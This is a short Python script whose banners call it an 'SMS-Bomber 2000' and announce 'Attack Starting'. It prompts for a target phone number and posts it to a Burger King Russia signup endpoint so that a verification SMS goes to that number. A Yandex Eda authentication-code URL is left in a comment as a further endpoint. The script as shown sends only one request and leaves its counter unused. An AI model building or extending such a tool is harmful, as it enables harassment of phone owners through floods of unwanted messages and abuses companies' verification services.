import requests
import time
array = """
┏━━━┓  ┏━━━┓  ┏━━┓      ┏━━┓       ┏━━━┳━━━┳━━━┓
┃┏━┓┃  ┃┏━┓┃  ┃┏┓┃      ┃┏┓┃       ┃┏━┓┃┏━┓┃┏━┓┃
┃┗━━┳┓┏┫┗━━┓  ┃┗┛┗┳━━┳┓┏┫┗┛┗┳━━┳━┓ ┗┛┏┛┃┃┃┃┃┃┃┃┃
┗━━┓┃┗┛┣━━┓┣━━┫┏━┓┃┏┓┃┗┛┃┏━┓┃┃━┫┏┻━┳┓┗┓┃┃┃┃┃┃┃┃┃
┃┗━┛┃┃┃┃┗━┛┣━━┫┗━┛┃┗┛┃┃┃┃┗━┛┃┃━┫┣━━┫┗━┛┃┗━┛┃┗━┛┃
┗━━━┻┻┻┻━━━┛  ┗━━━┻━━┻┻┻┻━━━┻━━┻┛  ┗━━━┻━━━┻━━━┛
"""
print(array)
array2 = """
       / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
      / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
     / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
    /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                     |___/ ......
"""
phone = input("Номер:")
i = 0
a = requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup", json={"phone": phone},)
print(array2)
i += 1
print(a.text)
#https://eda.yandex.ru/api/v1/user/request_authentication_code

